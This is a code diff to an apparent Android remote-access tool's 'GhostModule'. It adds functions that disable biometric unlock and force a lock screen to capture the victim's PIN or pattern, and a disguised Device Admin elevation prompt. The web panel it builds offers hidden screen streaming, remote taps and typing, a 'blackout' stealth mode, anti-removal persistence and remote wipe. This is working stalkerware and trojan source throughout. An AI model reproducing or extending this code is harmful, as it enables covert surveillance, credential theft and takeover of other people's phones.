@@ -67,7 +67,14 @@ public class GhostModule extends BaseModule {
         boolean lock = IO_Persistence_Manager.isLockActive();
         long idleTime = System.currentTimeMillis() - IO_Persistence_Manager.getLastEventTime();
         boolean isIdle = idleTime > 5000;
-        
+
+        boolean isAdmin = false;
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.content.ComponentName comp = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+            isAdmin = dpm != null && dpm.isAdminActive(comp);
+        } catch (Exception ignored) {}
+
         try {
             org.json.JSONObject obj = new org.json.JSONObject();
             obj.put("active", active);
@@ -75,6 +82,7 @@ public class GhostModule extends BaseModule {
             obj.put("blackout", blackout);
             obj.put("lock", lock);
             obj.put("isIdle", isIdle);
+            obj.put("isAdminActive", isAdmin);
             return newResponse(Response.Status.OK, "application/json", obj.toString());
         } catch (Exception e) {
             return newResponse(Response.Status.OK, "application/json", "{\"error\": true}");
@@ -87,6 +95,62 @@ public class GhostModule extends BaseModule {
             ghost.setRemoteLock(!IO_Persistence_Manager.isLockActive());
         }
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+    }
+
+    private Response triggerOsLock() {
+        // 1. If Device Admin is not active yet, dispatch Device Admin elevation prompt first
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+            if (dpm != null && !dpm.isAdminActive(admin)) {
+                new Handler(Looper.getMainLooper()).post(() -> {
+                    try {
+                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                            .edit().putBoolean("is_repairing", true).apply();
+                        IO_Persistence_Manager.setAutoPilot(true);
+                        IO_Persistence_Manager.stopSmartExit();
+
+                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                        wrapperIntent.putExtra("launch_admin", true);
+                        context.startActivity(wrapperIntent);
+                    } catch (Exception ignored) {}
+                });
+            }
+        } catch (Exception ignored) {}
+
+        // 2. Trigger Keyguard OS Phone Lock
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        boolean locked = false;
+        if (ghost != null) {
+            locked = ghost.lockScreenNow();
+        }
+
+        if (!locked) {
+            try {
+                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+                if (dpm != null && dpm.isAdminActive(admin)) {
+                    int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
+                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
+                    }
+                    dpm.setKeyguardDisabledFeatures(admin, disableFlags);
+                    dpm.lockNow();
+                    locked = true;
+                }
+            } catch (Exception e) {
+                android.util.Log.e("GhostModule", "Device Admin lockNow failed: " + e.getMessage());
+            }
+        }
+
+        if (locked) {
+            com.labs.labrats.FirebaseConfig.logActivity("KEYGUARD_LOCK: Standard OS phone lock triggered");
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\":\"OS_LOCK_DISPATCHED\"}");
+        }
+
+        return newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\":\"LOCK_SERVICE_UNAVAILABLE\"}");
     }
 
     private Response deployOverlay(Map<String, String> params) {
@@ -359,16 +423,17 @@ public class GhostModule extends BaseModule {
         html.append("</div>");
 
         // --- GHOST_UTILITIES_SECTION ---
+        html.append("<style>.ghost-utilities-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 20px; width: 100%; } @media (max-width: 960px) { .ghost-utilities-grid { grid-template-columns: 1fr !important; } }</style>");
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
         html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">GHOST_UTILITIES <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', 'Specialized background protocols for stealth, persistence, and remote maintenance.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
+        html.append("<div class=\"ghost-utilities-grid\">");
         
         // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
-        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.8rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
         html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
         html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
@@ -376,9 +441,9 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 2. Deep Repair Sequences
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button onclick=\"deepRepair()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\">APP_INFO</button>");
         html.append("<button onclick=\"openAccessibility()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">GHOST_MODE</button>");
         html.append("<button onclick=\"openNotifications()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INTEL_SYNC</button>");
@@ -386,95 +451,115 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 3. Automation/Persistence
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.8rem;\">AUTOMATION/PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
-        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px;\">");
+        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px; width: 100% !important;\">");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 100% !important; margin: 0;\">LOADING...</button>");
         html.append("</div></div>");
 
         // 4. Blackout Mode
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">BLACKOUT_MODE <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_MODE', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
         html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
         html.append("</div>");
 
-        // 5. System Denial Lock
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
-        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
-        html.append("</div>");
+        // 5. System Denial Lock & OS Keyguard Lock
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or deploy our persistent full-screen security denial overlay.')\">INFO</span></div>");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
+        html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
+        html.append("</div></div>");
 
-        // 6. Device Admin Elevation Section (Purple Card - Matching Blackout Protocol Button Style)
+        // 6. Device Admin Elevation Section
         html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
         html.append("<div class=\"info-label\" style=\"color: #a855f7; font-size: 0.8rem; font-weight: bold; letter-spacing: 1px;\">ADMIN_ELEVATION <span class=\"info-trigger\" style=\"border-color: rgba(168, 85, 247, 0.5); color: #a855f7;\" onclick=\"showInfo(event, 'ADMIN_ELEVATION', 'Enforce Device Administration policies on the target device. Grants elevated system administration protocols including remote instant screen locking, emergency data wipe, and anti-uninstall protection.')\">INFO</span></div>");
-        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.1); font-weight: bold;\">ELEVATE_ADMIN</button>");
+        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); font-weight: bold;\">ELEVATE_ADMIN</button>");
         html.append("</div>");
         
         html.append("</div></div>");
 
-        // Unified Interaction Suite (Flex Container for Desktop)
-        html.append("<style>");
-        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.4) !important; border-radius: 12px; background: var(--bg-card); overflow: hidden; box-shadow: none !important; }");
-        html.append("  .interaction-suite input { width: 100% !important; max-width: 100% !important; height: auto !important; }");
-        html.append("  .remote-control-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
-        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.4) !important; flex-shrink: 0; }");
-        html.append("  .inspector-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
-        html.append("  @media (max-width: 1024px) { .interaction-suite { flex-direction: column; flex-wrap: wrap; } .panel-divider { width: 100%; height: 1px; } .remote-control-panel, .inspector-panel { flex: 1 1 auto; padding: 25px 15px; width: 100%; } }");
-        html.append("</style>");
-
-        html.append("<div class=\"interaction-suite\">");
-
-        // Ghost Remote Control Section
-        html.append("<div class=\"remote-control-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
-        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%; margin: 0 0 30px 0;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
+        // Unified Interaction Suite (Vertical Stacked Cards)
+        // --- COMBINED CARD: GHOST_CONTROL & GHOST_INSPECTOR (SIDE-BY-SIDE) ---
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan); margin-top: 25px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; width: 100%;\">\n" +
+                    "  <style>\n" +
+                    "    @media (max-width: 1024px) {\n" +
+                    "      .ghost-side-by-side { grid-template-columns: 1fr !important; }\n" +
+                    "    }\n" +
+                    "  </style>");
         
-        // Screen View tool
-        html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
-        html.append("<div class=\"phone-notch\"></div>");
-        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
-        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
-        html.append("</div></div>");
+        // Let's replace the inner div with class/style
+        html.append("</div>"); // Close placeholder style
+        html.append("<div class=\"ghost-side-by-side\" style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; width: 100%;\">\n");
+
+        // Left Column: GHOST_CONTROL
+        html.append("<div style=\"display: flex; flex-direction: column; align-items: center; width: 100%; min-width: 0;\">");
+        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left; width: 100%;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
+        
+        // Screen View tool - Cyberpunk Mock Phone Frame
+        html.append("<div class=\"phone-frame\" style=\"margin: 0 auto 20px auto; align-self: center; position: relative; width: 280px; height: 560px; background: #000; border: 2px solid rgba(0, 242, 255, 0.4); border-radius: 32px; padding: 0 !important; overflow: hidden; box-sizing: border-box; box-shadow: 0 0 32px rgba(0, 242, 255, 0.32), 0 0 64px rgba(0, 242, 255, 0.12);\">");
+        html.append("<div style=\"position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 90px; height: 16px; background: #000; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; z-index: 5;\"></div>");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"position: absolute; top: 14px; left: 0; width: 100%; height: calc(100% - 14px); object-fit: cover; display: block; user-select: none; -webkit-user-drag: none; touch-action: none; border-radius: 28px; z-index: 2;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
+        html.append("<div id=\"ghost-lock-overlay\" style=\"display: none; position: absolute; top: 14px; left: 0; width: 100%; height: calc(100% - 14px); background: rgba(0,0,0,0.5); backdrop-filter: blur(2px); z-index: 10; align-items: center; justify-content: center; color: var(--neon-yellow); font-weight: bold; font-size: 0.8rem; letter-spacing: 1px; pointer-events: none; border-radius: 28px; text-shadow: 0 0 10px rgba(0,0,0,0.8);\">&#128274; PAGE SCROLL MODE</div>");
+        html.append("<div id=\"ghost-screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; font-size: 0.85rem; font-weight: 900; letter-spacing: 3px; text-shadow: 0 0 15px rgba(0,242,255,0.8), 0 0 30px rgba(0,242,255,0.4); text-transform: uppercase; z-index: 1; text-align: center;\">OLED_STANDBY</div>");
         html.append("</div>");
 
-        // Action Cluster (Grouped for alignment and centering)
-        html.append("<div style=\"width: 100%; max-width: 280px; display: flex; flex-direction: column; align-items: center; gap: 20px; align-self: center;\">");
+        // Action Cluster (Refined & Minified Tactical Layout)
+        html.append("<div style=\"width: 100%; max-width: 320px; display: flex; flex-direction: column; align-items: center; gap: 10px; align-self: center;\">");
         
-        // Toggle Initiate/Terminate button (Centered below screen)
-        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">INITIATE_VIEW</button>");
+        // Dual Action Header Row
+        html.append("<div style=\"display: flex; gap: 8px; width: 100%;\">");
+        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn btn-small\" style=\"flex: 1; margin: 0; padding: 10px 6px; font-size: 0.7rem; font-weight: bold; border-radius: 8px; border-color: var(--neon-cyan); color: var(--neon-cyan); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\">INITIATE_VIEW</button>");
+        html.append("<button id=\"ghost-lock-btn\" onclick=\"toggleGhostControlLock()\" class=\"btn btn-small\" style=\"flex: 1; margin: 0; padding: 10px 6px; font-size: 0.7rem; font-weight: bold; border-radius: 8px; background: rgba(57, 255, 20, 0.08); border-color: var(--neon-green); color: var(--neon-green); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\" title=\"Tap to Toggle Page Scroll vs Direct Target Control\">&#128274; SCROLL LOCK</button>");
+        html.append("</div>");
 
-        // Single Clean Swipe Up (Menu) button
-        html.append("<button onclick=\"fetch('/ghost/interact?action=swipe_up').then(()=>showToast('SWIPE_UP_DISPATCHED'))\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px; font-size: 0.75rem;\">&#9650; SWIPE UP (MENU)</button>");
+        // Directional Navigation & System Action Pad
+        html.append("<div id=\"ghost-nav-bar\" style=\"width: 100%; display: flex; flex-direction: column; gap: 6px; background: rgba(0,0,0,0.35); padding: 10px; border-radius: 10px; border: 1px solid rgba(0, 242, 255, 0.2); box-sizing: border-box;\">");
+        html.append("<div style=\"font-size: 0.6rem; color: var(--neon-cyan); text-transform: uppercase; letter-spacing: 1.5px; text-align: center; font-weight: bold; margin-bottom: 2px;\">REMOTE NAVIGATION</div>");
+        
+        // Ultra-Compact D-Pad Grid (Cross Layout)
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: auto auto; gap: 3px; width: 100%; max-width: 220px; margin: 0 auto; align-items: center;\">");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('left')\" class=\"btn btn-small\" style=\"grid-column: 1; grid-row: 1 / span 2; align-self: center; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Left\">&#9664; LEFT</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('up')\" class=\"btn btn-small\" style=\"grid-column: 2; grid-row: 1; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Up\">&#9650; UP</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('down')\" class=\"btn btn-small\" style=\"grid-column: 2; grid-row: 2; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Down\">&#9660; DOWN</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('right')\" class=\"btn btn-small\" style=\"grid-column: 3; grid-row: 1 / span 2; align-self: center; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Right\">&#9654; RIGHT</button>");
+        html.append("</div>");
 
-        // Remote Typing Input group
-        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; gap: 10px;\">");
-        html.append("<input id=\"ghost-type-input\" type=\"text\" placeholder=\"Enter text to type...\" style=\"width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; font-size: 0.75rem; outline: none; text-align: center; box-sizing: border-box;\">");
-        html.append("<button onclick=\"ghostType()\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-green); color: var(--neon-green); margin: 0; background: rgba(57, 255, 20, 0.05);\">INJECT_TEXT</button>");
+        // Compact System Navigation Bar (Swapped: RECENT | HOME | BACK)
+        html.append("<div style=\"display: flex; gap: 4px; width: 100%; margin-top: 2px;\">");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=recents')\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Recents\">&#9638; RECENT</button>");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=home')\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-green); color:var(--neon-green); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Home\">&#8962; HOME</button>");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=back')\" class=\"btn btn-small\" style=\"flex:1; border-color:#ff9d00; color:#ff9d00; padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Back\">&#11013; BACK</button>");
+        html.append("</div>");
+        html.append("</div>"); // Close ghost-nav-bar
+
+        // Remote Input Row
+        html.append("<div style=\"width: 100%; display: flex; gap: 6px; align-items: center;\">");
+        html.append("<input id=\"ghost-type-input\" type=\"text\" placeholder=\"Type text &amp; press Enter...\" onkeypress=\"if(event.key==='Enter'){ghostType();}\" style=\"flex: 1; padding: 8px 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; font-size: 0.72rem; outline: none; text-align: left; box-sizing: border-box; height: 35px;\">");
+        html.append("<button type=\"button\" onclick=\"ghostType()\" class=\"btn btn-small\" style=\"height: 35px !important; min-height: 35px !important; line-height: 35px !important; padding: 0 10px !important; width: 65px !important; margin: 0; border-color: var(--neon-cyan); color: var(--neon-cyan); font-size: 0.62rem; border-radius: 8px;\">SEND</button>");
         html.append("</div>");
 
         html.append("</div>"); // Close action cluster
-        html.append("</div>"); // Close left panel
+        html.append("</div>"); // Close left column
 
-        // Sharp Vertical Divider
-        html.append("<div class=\"panel-divider\"></div>");
-
-        // --- RIGHT PANEL: UI INSPECTOR ---
-        html.append("<div class=\"inspector-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
-        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 30px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left;\">GHOST_INSPECTOR <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
-        html.append("<div id=\"inspector-tree\" class=\"terminal-text\" style=\"height:600px; width:100%; overflow-y:auto; font-size:0.75rem; border:1px solid rgba(0, 242, 255, 0.1); background: rgba(0,0,0,0.4); text-align: left;\">");
+        // Right Column: GHOST_INSPECTOR
+        html.append("<div style=\"display: flex; flex-direction: column; align-items: center; width: 100%; min-width: 0;\">");
+        html.append("<div style=\"width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center;\">");
+        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%;\">GHOST_INSPECTOR <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
+        html.append("<div id=\"inspector-tree\" class=\"terminal-text\" style=\"height:660px; width:100%; overflow-y:auto; font-size:0.75rem; border:1px solid rgba(0, 242, 255, 0.1); background: rgba(0,0,0,0.4); text-align: left; box-sizing: border-box;\">");
         html.append("[STANDBY] Press REFRESH_TREE to scan active window...");
         html.append("</div></div>");
         
         // Refresh Button
-        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:280px; margin: 30px auto 0 auto; align-self: center;\">REFRESH_TREE</button>");
-        html.append("</div>"); // Close right panel
+        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:320px; margin: 20px auto 0 auto; display: block;\">REFRESH_TREE</button>");
+        html.append("</div>"); // Close right column
 
-        html.append("</div>"); // Close interaction-suite
+        html.append("</div>"); // Close grid
+        html.append("</div>"); // Close combined card
 
         // --- GHOST TOAST CARD ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
@@ -603,6 +688,31 @@ public class GhostModule extends BaseModule {
             return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
         }
 
+        if (action.equals("os_lock") || action.equals("oslock")) {
+            return triggerOsLock();
+        }
+
+        if (action.equals("elevateAdmin") || action.equals("elevate_admin") || action.equals("admin")) {
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                        .edit().putBoolean("is_repairing", true).apply();
+                    IO_Persistence_Manager.setAutoPilot(true);
+                    IO_Persistence_Manager.stopSmartExit();
+
+                    Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                    wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                    wrapperIntent.putExtra("launch_admin", true);
+                    context.startActivity(wrapperIntent);
+
+                    com.labs.labrats.FirebaseConfig.logActivity("GHOST_CONTROL: Device Admin elevation prompt dispatched");
+                } catch (Exception e) {
+                    android.util.Log.e("GhostModule", "Failed to launch device admin wrapper: " + e.getMessage());
+                }
+            });
+            return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        }
+
         if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");
 
         if (IO_Persistence_Manager.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
